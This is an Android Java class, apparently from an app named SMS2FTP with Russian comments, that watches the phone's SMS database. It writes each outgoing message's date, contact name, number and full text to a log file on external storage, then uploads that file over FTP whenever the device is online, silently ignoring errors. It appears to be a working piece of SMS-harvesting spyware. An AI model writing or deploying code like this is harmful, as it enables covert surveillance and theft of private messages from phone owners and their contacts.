package com.n1ck.SMS2FTP;

import java.io.File;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;

public class OutgoingSMS extends ContentObserver {


    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private Context mContext;
    String internet = "";

    public OutgoingSMS(Handler handler, Context ctx) {
        super(handler);
        mContext = ctx;
    }

    public boolean deliverSelfNotifications() {
        return true;
    }

    public void onChange(boolean selfChange) {

        new Thread(new Runnable() {

            @Override
            public void run() {
                try {
                    internet = NetworkUtil.getConnectivityStatusString(mContext);

                    final Cursor sms_sent_cursor = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);
                    if (sms_sent_cursor != null) {
                        if (sms_sent_cursor.moveToFirst()) {

                            String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));

                            if (protocol == null) {

                                int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));

                                //type 2 = папка исходящие
                                if (type == 2) {

                                    Thread.sleep(400);

                                    File dir = new File(Environment.getExternalStorageDirectory(), "/log/");
                                    if (!dir.exists()) {
                                        dir.mkdirs();
                                    }

                                    AppendText append = new AppendText();
                                    String msg = "SMS: " + append.convertDate(sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date"))) + "; OUT; "
                                            + append.getContactName(mContext, sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"))) +
                                            "; " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")) + "; " +
                                            sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body"));

                                    //Добавляем СМС информацию к файлу

                                    append.appendStringToFile(msg, "/log/log.txt");

                                    if (internet == "1" || internet == "2") {
                                        FTPConnect ftp = new FTPConnect();
                                        ftp.connectToFTP(mContext, "log.txt");

                                    }
                                }
                            }
                        }
                    }
                    sms_sent_cursor.close();
                } catch (Exception e) {
                }
            }
        }).start();

        super.onChange(selfChange);
    }
}